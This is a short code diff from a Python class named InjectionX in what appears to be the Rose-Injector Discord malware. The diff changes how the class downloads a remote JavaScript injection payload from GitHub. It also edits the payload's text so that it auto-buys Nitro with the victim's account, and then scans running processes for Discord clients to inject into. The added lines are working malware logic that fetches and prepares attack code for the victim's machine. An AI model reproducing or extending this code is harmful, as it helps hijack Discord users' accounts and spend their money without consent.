@@ -19,12 +19,9 @@ class InjectionX:
             self.appdata + '\\DiscordPTB',
             self.appdata + '\\DiscordDevelopment'
         ]
+        self.code = requests.get('https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/injection/injection.js').text
         if cc.get_nitro_auto_buy() is True:
-            self.code = requests.get('https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/injection/auto_buy__TRUE__injection.js').text
-        if cc.get_nitro_auto_buy() is False:
-            self.code = requests.get('https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/injection/auto_buy__FALSE__injection.js').text
-        else:
-            self.code = requests.get('https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/injection/auto_buy__FALSE__injection.js').text
+            self.code = self.code.replace("auto_buy_nitro: false,", "auto_buy_nitro: true,")
 
         for proc in psutil.process_iter():
             if 'discord' in proc.name().lower():
